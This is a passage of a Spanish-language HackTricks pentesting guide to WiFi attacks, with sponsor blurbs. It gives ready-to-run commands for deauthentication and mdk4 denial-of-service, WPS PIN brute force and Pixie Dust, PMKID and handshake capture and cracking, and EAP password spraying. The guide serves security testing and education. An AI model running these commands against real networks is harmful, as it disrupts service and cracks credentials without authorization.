# Pentesting Wifi

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

√önete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de bugs!

**Perspectivas de Hacking**\
Invol√∫crate con contenido que explora la emoci√≥n y los desaf√≠os del hacking

**Noticias de Hacking en Tiempo Real**\
Mantente al d√≠a con el mundo del hacking a trav√©s de noticias e informaci√≥n en tiempo real

**√öltimos Anuncios**\
Mantente informado sobre los nuevos programas de recompensas por bugs y actualizaciones importantes de plataformas

**√önete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) y comienza a colaborar con los mejores hackers hoy!

## Comandos b√°sicos de Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
```
## Herramientas

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon

Airgeddon es una herramienta de prueba de penetraci√≥n todo en uno para redes inal√°mbricas. Ofrece una amplia gama de funciones para realizar pruebas de seguridad en redes WiFi, incluyendo ataques de deautenticaci√≥n, ataques de fuerza bruta, ataques de diccionario, y m√°s. Es una herramienta muy potente y popular en la comunidad de seguridad inform√°tica.
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Ejecutar airgeddon con docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
### wifiphisher

Puede realizar ataques de Evil Twin, KARMA y Beacons Conocidos y luego utilizar una plantilla de phishing para lograr obtener la contrase√±a real de la red o capturar credenciales de redes sociales.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Esta herramienta automatiza ataques **WPS/WEP/WPA-PSK**. Autom√°ticamente:

* Configura la interfaz en modo monitor
* Escanea posibles redes - Y te permite seleccionar a la(s) v√≠ctima(s)
* Si es WEP - Lanza ataques WEP
* Si es WPA-PSK
* Si es WPS: Ataque Pixie dust y ataque de fuerza bruta (ten cuidado, el ataque de fuerza bruta podr√≠a llevar mucho tiempo). Ten en cuenta que no intenta PIN nulo ni PIN generados de base de datos.
* Intenta capturar el PMKID del AP para crackearlo
* Intenta desautenticar clientes del AP para capturar un handshake
* Si tiene PMKID o Handshake, intenta fuerza bruta usando las 5000 contrase√±as principales.

## Resumen de Ataques

* **DoS**
* Paquetes de desautenticaci√≥n/desasociaci√≥n -- Desconectar a todos (o a un ESSID/Cliente espec√≠fico)
* APs falsos aleatorios -- Ocultar redes, posiblemente bloquear esc√°neres
* Sobrecargar AP -- Intentar desactivar el AP (generalmente no muy √∫til)
* WIDS -- Jugar con el IDS
* TKIP, EAPOL -- Algunos ataques espec√≠ficos para DoS en algunos APs
* **Cracking**
* Crackear **WEP** (varias herramientas y m√©todos)
* **WPA-PSK**
* PIN de **WPS** "Fuerza Bruta"
* **WPA PMKID** fuerza bruta
* \[DoS +] Captura de **handshake WPA** + Cracking
* **WPA-MGT**
* Captura de **nombre de usuario**
* **Fuerza Bruta** de credenciales
* **Doble Malvado** (con o sin DoS)
* Doble Malvado **Abierto** \[+ DoS] -- √ötil para capturar credenciales de portal cautivo y/o realizar ataques LAN
* Doble Malvado **WPA-PSK** -- √ötil para ataques de red si conoces la contrase√±a
* **WPA-MGT** -- √ötil para capturar credenciales de empresa
* **KARMA, MANA**, **MANA Ruidoso**, **Baliza Conocida**
* **+ Abierto** -- √ötil para capturar credenciales de portal cautivo y/o realizar ataques LAN
* **+ WPA** -- √ötil para capturar handshakes de WPA

## DOS

### Paquetes de Desautenticaci√≥n

**Descripci√≥n de** [**aqu√≠**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

Los ataques de **desautenticaci√≥n**, un m√©todo prevalente en el hacking de Wi-Fi, implican forjar marcos de "gesti√≥n" para **desconectar dispositivos de una red** de forma forzada. Estos paquetes no encriptados enga√±an a los clientes haci√©ndoles creer que provienen de la red leg√≠tima, permitiendo a los atacantes recopilar handshakes de WPA con fines de cracking o interrumpir persistentemente las conexiones de red. Esta t√°ctica, alarmante en su simplicidad, es ampliamente utilizada y tiene implicaciones significativas para la seguridad de la red.

**Desautenticaci√≥n usando Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 significa deautenticaci√≥n
* 1 es el n√∫mero de deautenticaciones a enviar (puedes enviar varias si lo deseas); 0 significa enviarlas continuamente
* \-a 00:14:6C:7E:40:80 es la direcci√≥n MAC del punto de acceso
* \-c 00:0F:B5:34:30:30 es la direcci√≥n MAC del cliente a desautenticar; si se omite esto, se env√≠a una desautenticaci√≥n de difusi√≥n (no siempre funciona)
* ath0 es el nombre de la interfaz

### Paquetes de Desasociaci√≥n

**Los paquetes de desasociaci√≥n**, similares a los paquetes de deautenticaci√≥n, son un tipo de trama de gesti√≥n utilizada en redes Wi-Fi. Estos paquetes sirven para cortar la conexi√≥n entre un dispositivo (como una computadora port√°til o un tel√©fono inteligente) y un punto de acceso (AP). La distinci√≥n principal entre la desasociaci√≥n y la deautenticaci√≥n radica en sus escenarios de uso. Mientras que un AP emite **paquetes de deautenticaci√≥n para eliminar expl√≠citamente dispositivos no autorizados de la red, los paquetes de desasociaci√≥n se env√≠an t√≠picamente cuando el AP se est√° apagando, reiniciando o reubicando, lo que requiere la desconexi√≥n de todos los nodos conectados.

**Este ataque puede ser realizado por mdk4 (modo "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **M√°s ataques DOS por mdk4**

**En** [**aqu√≠**](https://en.kali.tools/?p=864)**.**

**MODO DE ATAQUE b: Inundaci√≥n de Beacons**

Env√≠a tramas de beacons para mostrar APs falsos a los clientes. ¬°Esto a veces puede hacer que los esc√°neres de red e incluso los controladores se bloqueen!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**MODO DE ATAQUE a: Denegaci√≥n de Servicio de Autenticaci√≥n**

Enviar tramas de autenticaci√≥n a todos los Puntos de Acceso (APs) accesibles dentro del rango puede sobrecargar estos APs, especialmente cuando hay numerosos clientes involucrados. Este tr√°fico intenso puede provocar inestabilidad en el sistema, causando que algunos APs se congelen o incluso se reinicien.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**MODO DE ATAQUE p: Sondeo de SSID y Fuerza Bruta**

Sondear Puntos de Acceso (APs) verifica si se revela correctamente un SSID y confirma el alcance del AP. Esta t√©cnica, combinada con **fuerza bruta de SSIDs ocultos** con o sin una lista de palabras, ayuda a identificar y acceder a redes ocultas.

**MODO DE ATAQUE m: Explotaci√≥n de Contramedidas de Michael**

Enviar paquetes aleatorios o duplicados a diferentes colas de QoS puede desencadenar Contramedidas de Michael en APs **TKIP**, lo que provoca un apagado de AP de un minuto. Este m√©todo es una t√°ctica de ataque **DoS** (Denegaci√≥n de Servicio) eficiente.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**MODO DE ATAQUE e: Inyecci√≥n de Paquetes EAPOL Start y Logoff**

Inundar un AP con **tramas de inicio EAPOL** crea **sesiones falsas**, abrumando al AP y bloqueando clientes leg√≠timos. Alternativamente, inyectar **mensajes falsos de Logoff EAPOL** desconecta a los clientes de forma forzada, ambos m√©todos interrumpen efectivamente el servicio de red.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**MODO DE ATAQUE s: Ataques para redes de malla IEEE 802.11s**

Varios ataques en la gesti√≥n de enlaces y enrutamiento en redes de malla.

**MODO DE ATAQUE w: Confusi√≥n de WIDS**

Conectar clientes entre m√∫ltiples nodos WDS o puntos de acceso falsos puede manipular los Sistemas de Detecci√≥n y Prevenci√≥n de Intrusiones, creando confusi√≥n y posibles abusos del sistema.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**MODO DE ATAQUE f: Fuzzer de Paquetes**

Un fuzzer de paquetes que ofrece diversas fuentes de paquetes y un conjunto completo de modificadores para la manipulaci√≥n de paquetes.

### **Airggedon**

_**Airgeddon**_ ofrece la mayor√≠a de los ataques propuestos en los comentarios anteriores:

![](<../../.gitbook/assets/image (126).png>)

## WPS

WPS (Wi-Fi Protected Setup) simplifica el proceso de conexi√≥n de dispositivos a un enrutador, mejorando la velocidad de configuraci√≥n y facilidad para redes encriptadas con **WPA** o **WPA2** Personal. Es ineficaz para la seguridad f√°cilmente comprometida de WEP. WPS emplea un PIN de 8 d√≠gitos, validado en dos mitades, lo que lo hace susceptible a ataques de fuerza bruta debido a su n√∫mero limitado de combinaciones (11,000 posibilidades).

### Fuerza Bruta en WPS

Existen 2 herramientas principales para realizar esta acci√≥n: Reaver y Bully.

* **Reaver** ha sido dise√±ado para ser un ataque robusto y pr√°ctico contra WPS, y ha sido probado contra una amplia variedad de puntos de acceso e implementaciones de WPS.
* **Bully** es una **nueva implementaci√≥n** del ataque de fuerza bruta en WPS, escrita en C. Tiene varias ventajas sobre el c√≥digo original de reaver: menos dependencias, mejor rendimiento de memoria y CPU, manejo correcto de endianness y un conjunto de opciones m√°s robusto.

El ataque explota la **vulnerabilidad del PIN de WPS**, particularmente su exposici√≥n de los primeros cuatro d√≠gitos y el papel del √∫ltimo d√≠gito como suma de verificaci√≥n, facilitando el ataque de fuerza bruta. Sin embargo, las defensas contra ataques de fuerza bruta, como **bloquear las direcciones MAC** de atacantes agresivos, exigen **rotaci√≥n de direcciones MAC** para continuar el ataque.

Al obtener el PIN de WPS con herramientas como Bully o Reaver, el atacante puede deducir el PSK de WPA/WPA2, asegurando **acceso persistente a la red**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Fuerza Bruta Inteligente**

Este enfoque refinado se centra en los PIN de WPS utilizando vulnerabilidades conocidas:

1. **PINs Pre-descubiertos**: Utiliza una base de datos de PINs conocidos vinculados a fabricantes espec√≠ficos que utilizan PINs de WPS uniformes. Esta base de datos correlaciona los primeros tres octetos de las direcciones MAC con los PINs probables para estos fabricantes.
2. **Algoritmos de Generaci√≥n de PIN**: Aprovecha algoritmos como ComputePIN y EasyBox, que calculan PINs de WPS basados en la direcci√≥n MAC del AP. El algoritmo de Arcadyan requiere adicionalmente un ID de dispositivo, a√±adiendo una capa al proceso de generaci√≥n de PIN.

### Ataque WPS Pixie Dust

**Dominique Bongard** descubri√≥ una falla en algunos Puntos de Acceso (APs) relacionada con la creaci√≥n de c√≥digos secretos, conocidos como **nonces** (**E-S1** y **E-S2**). Si estos nonces pueden ser descifrados, crackear el PIN de WPS del AP se vuelve f√°cil. El AP revela el PIN dentro de un c√≥digo especial (hash) para demostrar que es leg√≠timo y no un AP falso (rogue). Estos nonces son esencialmente las "llaves" para desbloquear la "caja fuerte" que contiene el PIN de WPS. M√°s informaci√≥n al respecto se puede encontrar [aqu√≠](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\)).

En t√©rminos simples, el problema radica en que algunos APs no utilizan claves lo suficientemente aleatorias para cifrar el PIN durante el proceso de conexi√≥n. Esto hace que el PIN sea vulnerable a ser adivinado desde fuera de la red (ataque de fuerza bruta offline).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
### Ataque de Pin nulo

Algunos sistemas mal dise√±ados incluso permiten que un **PIN nulo** (un PIN vac√≠o o inexistente) conceda acceso, lo cual es bastante inusual. La herramienta **Reaver** es capaz de probar esta vulnerabilidad, a diferencia de **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Todos los ataques propuestos de WPS se pueden realizar f√°cilmente usando _**airgeddon.**_

![](<../../.gitbook/assets/image (124).png>)

* 5 y 6 te permiten probar **tu PIN personalizado** (si tienes alguno)
* 7 y 8 realizan el ataque de **Pixie Dust**
* 13 te permite probar el **PIN NULL**
* 11 y 12 **recopilar√°n los PIN relacionados con el AP seleccionado de las bases de datos disponibles** y **generar√°n** posibles **PIN** usando: ComputePIN, EasyBox y opcionalmente Arcadyan (recomendado, ¬øpor qu√© no?)
* 9 y 10 probar√°n **cada PIN posible**

## **WEP**

Tan vulnerable y poco utilizado en la actualidad. Solo ten en cuenta que _**airgeddon**_ tiene una opci√≥n WEP llamada "All-in-One" para atacar este tipo de protecci√≥n. M√°s herramientas ofrecen opciones similares.

![](<../../.gitbook/assets/image (125).png>)


***

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

√önete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de bugs!

**Perspectivas de Hacking**\
Participa en contenido que profundiza en la emoci√≥n y desaf√≠os del hacking

**Noticias de Hacking en Tiempo Real**\
Mantente al d√≠a con el mundo del hacking a trav√©s de noticias e informaci√≥n en tiempo real

**√öltimos Anuncios**\
Mantente informado sobre los nuevos programas de recompensas por bugs y actualizaciones cruciales de plataformas

**√önete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) y comienza a colaborar con los mejores hackers hoy!

***


## WPA/WPA2 PSK

### PMKID

En 2018, **hashcat** [revel√≥](https://hashcat.net/forum/thread-7717.html) un nuevo m√©todo de ataque, √∫nico porque solo necesita **un solo paquete** y no requiere que ning√∫n cliente est√© conectado al AP objetivo, solo la interacci√≥n entre el atacante y el AP.

Muchos routers modernos a√±aden un **campo opcional** al **primer marco EAPOL** durante la asociaci√≥n, conocido como `Red de Seguridad Robusta`. Esto incluye el `PMKID`.

Como explica el post original, el **PMKID** se crea utilizando datos conocidos:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Dado que el "Nombre PMK" es constante, conocemos el BSSID del AP y de la estaci√≥n, y el `PMK` es id√©ntico al de un apret√≥n de manos completo de 4 v√≠as, **hashcat** puede usar esta informaci√≥n para descifrar la PSK y recuperar la frase de paso!

Para **recopilar** esta informaci√≥n y **realizar** localmente la fuerza bruta de la contrase√±a, puedes hacer:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Los **PMKIDs capturados** se mostrar√°n en la **consola** y tambi√©n se **guardar√°n** dentro de \_ **/tmp/attack.pcap**\_\
Ahora, convierte la captura al formato de **hashcat/john** y desc√≠frala:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Por favor, ten en cuenta que el formato correcto de un hash contiene **4 partes**, como: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838`
Si el tuyo **solo** contiene **3 partes**, entonces, es **inv√°lido** (la captura PMKID no fue v√°lida).

Ten en cuenta que `hcxdumptool` **tambi√©n captura handshakes** (algo as√≠ aparecer√°: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Puedes **transformar** los **handshakes** al formato de **hashcat**/**john** usando `cap2hccapx`.
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_He notado que algunas capturas de apretones de manos realizadas con esta herramienta no se pudieron descifrar incluso sabiendo la contrase√±a correcta. Recomiendo capturar apretones de manos tambi√©n de forma tradicional si es posible, o capturar varios de ellos usando esta herramienta._

### Captura de apret√≥n de manos

Un ataque a redes **WPA/WPA2** se puede ejecutar capturando un **apret√≥n de manos** e intentando **descifrar** la contrase√±a **sin conexi√≥n**. Este proceso implica monitorear la comunicaci√≥n de una red espec√≠fica y **BSSID** en un **canal** particular. Aqu√≠ tienes una gu√≠a simplificada:

1. Identifica el **BSSID**, el **canal** y un **cliente conectado** de la red objetivo.
2. Usa `airodump-ng` para monitorear el tr√°fico de red en el canal y BSSID especificados, con la esperanza de capturar un apret√≥n de manos. El comando se ver√° as√≠:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Para aumentar la probabilidad de capturar un handshake, desconecta moment√°neamente al cliente de la red para forzar una nueva autenticaci√≥n. Esto se puede hacer utilizando el comando `aireplay-ng`, que env√≠a paquetes de desautenticaci√≥n al cliente:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Nota que una vez que el cliente fue desautenticado, podr√≠a intentar conectarse a un AP diferente o, en otros casos, a una red diferente._

Una vez que en `airodump-ng` aparezca informaci√≥n de handshake, significa que el handshake fue capturado y puedes dejar de escuchar:

![](<../../.gitbook/assets/image (172) (1).png>)

Una vez que el handshake es capturado, puedes **descifrarlo** con `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Verificar si hay handshake en el archivo

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Si esta herramienta encuentra un apret√≥n de manos incompleto de un ESSID antes que el completo, no detectar√° el v√°lido._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

En **configuraciones de WiFi empresarial, encontrar√°s varios m√©todos de autenticaci√≥n**, cada uno proporcionando diferentes niveles de seguridad y caracter√≠sticas de gesti√≥n. Cuando utilizas herramientas como `airodump-ng` para inspeccionar el tr√°fico de red, es posible que notes identificadores para estos tipos de autenticaci√≥n. Algunos m√©todos comunes incluyen:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Este m√©todo admite tokens de hardware y contrase√±as de un solo uso dentro de EAP-PEAP. A diferencia de MSCHAPv2, no utiliza un desaf√≠o entre pares y env√≠a contrase√±as en texto plano al punto de acceso, lo que representa un riesgo para ataques de degradaci√≥n.

2. **EAP-MD5 (Message Digest 5)**:
- Implica enviar el hash MD5 de la contrase√±a desde el cliente. **No se recomienda** debido a la vulnerabilidad a ataques de diccionario, falta de autenticaci√≥n del servidor e incapacidad para generar claves WEP espec√≠ficas de sesi√≥n.

3. **EAP-TLS (Transport Layer Security)**:
- Utiliza certificados tanto del lado del cliente como del servidor para la autenticaci√≥n y puede generar din√°micamente claves WEP basadas en usuario y sesi√≥n para asegurar las comunicaciones.

4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Proporciona autenticaci√≥n mutua a trav√©s de un t√∫nel cifrado, junto con un m√©todo para derivar claves WEP din√°micas, por usuario y por sesi√≥n. Solo requiere certificados del lado del servidor, con los clientes utilizando credenciales.

5. **PEAP (Protected Extensible Authentication Protocol)**:
- Funciona de manera similar a EAP creando un t√∫nel TLS para comunicaciones protegidas. Permite el uso de protocolos de autenticaci√≥n m√°s d√©biles sobre EAP debido a la protecci√≥n ofrecida por el t√∫nel.
* **PEAP-MSCHAPv2**: A menudo referido como PEAP, combina el mecanismo de desaf√≠o/respuesta vulnerable MSCHAPv2 con un t√∫nel TLS protector.
* **PEAP-EAP-TLS (o PEAP-TLS)**: Similar a EAP-TLS pero inicia un t√∫nel TLS antes de intercambiar certificados, ofreciendo una capa adicional de seguridad.

Puedes encontrar m√°s informaci√≥n sobre estos m√©todos de autenticaci√≥n [aqu√≠](https://en.wikipedia.org/wiki/Extensible\_Authentication\_Protocol) y [aqu√≠](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Captura de Nombre de Usuario

Al leer [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) parece que si est√°s utilizando **EAP**, los **"mensajes de Identidad"** deben ser **compatibles**, y el **nombre de usuario** se enviar√° en **claro** en los **mensajes de Respuesta de Identidad**.

Incluso al utilizar uno de los m√©todos de autenticaci√≥n m√°s seguros: **PEAP-EAP-TLS**, es posible **capturar el nombre de usuario enviado en el protocolo EAP**. Para hacerlo, **captura una comunicaci√≥n de autenticaci√≥n** (inicia `airodump-ng` en un canal y `wireshark` en la misma interfaz) y filtra los paquetes por `eapol`.\
Dentro del paquete "**Respuesta, Identidad**", aparecer√° el **nombre de usuario** del cliente.

![](<../../.gitbook/assets/image (150).png>)

### Identidades An√≥nimas

El ocultamiento de identidad es compatible tanto con EAP-PEAP como con EAP-TTLS. En el contexto de una red WiFi, una solicitud de EAP-Identidad es t√≠picamente iniciada por el punto de acceso (AP) durante el proceso de asociaci√≥n. Para garantizar la protecci√≥n del anonimato del usuario, la respuesta del cliente EAP en el dispositivo del usuario contiene solo la informaci√≥n esencial requerida para que el servidor RADIUS inicial procese la solicitud. Este concepto se ilustra a trav√©s de los siguientes escenarios:

* EAP-Identidad = an√≥nimo

- En este escenario, todos los usuarios emplean el seud√≥nimo "an√≥nimo" como su identificador de usuario. El servidor RADIUS inicial funciona como un servidor EAP-PEAP o EAP-TTLS, responsable de gestionar el lado del servidor del protocolo PEAP o TTLS. El m√©todo de autenticaci√≥n interno (protegido) es manejado localmente o delegado a un servidor RADIUS remoto (de origen).

* EAP-Identidad = an√≥nimo@reino_x

- En esta situaci√≥n, los usuarios de diferentes reinos ocultan sus identidades mientras indican sus respectivos reinos. Esto permite que el servidor RADIUS inicial reenv√≠e las solicitudes EAP-PEAP o EAP-TTLS a servidores RADIUS en sus reinos de origen, que act√∫an como el servidor PEAP o TTLS. El servidor RADIUS inicial opera √∫nicamente como un nodo de retransmisi√≥n RADIUS.

- Alternativamente, el servidor RADIUS inicial puede funcionar como el servidor EAP-PEAP o EAP-TTLS y manejar el m√©todo de autenticaci√≥n protegido o reenviarlo a otro servidor. Esta opci√≥n facilita la configuraci√≥n de pol√≠ticas distintas para varios reinos.

En EAP-PEAP, una vez que se establece el t√∫nel TLS entre el servidor PEAP y el cliente PEAP, el servidor PEAP inicia una solicitud de EAP-Identidad y la transmite a trav√©s del t√∫nel TLS. El cliente responde a esta segunda solicitud de EAP-Identidad enviando una respuesta de EAP-Identidad que contiene la verdadera identidad del usuario a trav√©s del t√∫nel cifrado. Este enfoque evita efectivamente la revelaci√≥n de la identidad real del usuario a cualquier persona que est√© interceptando el tr√°fico 802.11.

EAP-TTLS sigue un procedimiento ligeramente diferente. Con EAP-TTLS, el cliente t√≠picamente se autentica usando PAP o CHAP, asegurado por el t√∫nel TLS. En este caso, el cliente incluye un atributo Nombre de Usuario y ya sea una Contrase√±a o un atributo CHAP-Contrase√±a en el mensaje TLS inicial enviado despu√©s del establecimiento del t√∫nel.

Independientemente del protocolo elegido, el servidor PEAP/TTLS obtiene conocimiento de la verdadera identidad del usuario despu√©s de que se haya establecido el t√∫nel TLS. La verdadera identidad puede representarse como usuario@reino o simplemente usuario. Si el servidor PEAP/TTLS tambi√©n es responsable de autenticar al usuario, ahora posee la identidad del usuario y procede con el m√©todo de autenticaci√≥n protegido por el t√∫nel TLS. Alternativamente, el servidor PEAP/TTLS puede reenviar una nueva solicitud RADIUS al servidor RADIUS de origen del usuario. Esta nueva solicitud RADIUS omite la capa de protocolo PEAP o TTLS. En casos donde el m√©todo de autenticaci√≥n protegido es EAP, los mensajes EAP internos se transmiten al servidor RADIUS de origen sin el envoltorio EAP-PEAP o EAP-TTLS. El atributo Nombre de Usuario del mensaje RADIUS saliente contiene la verdadera identidad del usuario, reemplazando el Nombre de Usuario an√≥nimo del mensaje RADIUS entrante. Cuando el m√©todo de autenticaci√≥n protegido es PAP o CHAP (soportado solo por TTLS), el Nombre de Usuario y otros atributos de autenticaci√≥n extra√≠dos de la carga √∫til TLS se sustituyen en el mensaje RADIUS saliente, desplazando el Nombre de Usuario an√≥nimo y los atributos de Mensaje EAP-TTLS encontrados en la solicitud RADIUS entrante.

Para m√°s informaci√≥n, consulta [https://www.interlinknetworks.com/app\_notes/eap-peap.htm](https://www.interlinknetworks.com/app\_notes/eap-peap.htm)

### EAP-Bruteforce (password spray)

Si se espera que el cliente utilice un **nombre de usuario y contrase√±a** (nota que **EAP-TLS no ser√° v√°lido** en este caso), entonces podr√≠as intentar obtener una **lista** de **nombres de usuario** (ver la siguiente parte) y **contrase√±as** e intentar **bruteforce** el acceso usando [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Tambi√©n puedes realizar este ataque utilizando `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Ataques a clientes: Teor√≠a

### Selecci√≥n de red y roaming

- El protocolo 802.11 define c√≥mo una estaci√≥n se une a un Conjunto de Servicios Extendido (ESS) pero no especifica los criterios para seleccionar un ESS o un punto de acceso (AP) dentro de √©l.
- Las estaciones pueden moverse entre APs que comparten el mismo ESSID, manteniendo la conectividad en un edificio o √°rea.
- El protocolo requiere autenticaci√≥n de la estaci√≥n al ESS pero no exige autenticaci√≥n del AP a la estaci√≥n.

### Listas de Redes Preferidas (PNL)

- Las estaciones almacenan el ESSID de cada red inal√°mbrica a la que se conectan en su Lista de Redes Preferidas (PNL), junto con detalles de configuraci√≥n espec√≠ficos de la red.
- La PNL se utiliza para conectarse autom√°ticamente a redes conocidas, mejorando la experiencia del usuario al agilizar el proceso de conexi√≥n.

### Escaneo pasivo

- Los APs emiten peri√≥dicamente tramas de balizas, anunciando su presencia y caracter√≠sticas, incluido el ESSID del AP a menos que la difusi√≥n est√© desactivada.
- Durante el escaneo pasivo, las estaciones escuchan las tramas de balizas. Si el ESSID de una baliza coincide con una entrada en la PNL de la estaci√≥n, la estaci√≥n puede conectarse autom√°ticamente a ese AP.
- El conocimiento de la PNL de un dispositivo permite una posible explotaci√≥n al imitar el ESSID de una red conocida, enga√±ando al dispositivo para que se conecte a un AP falso.

### Sondeo activo

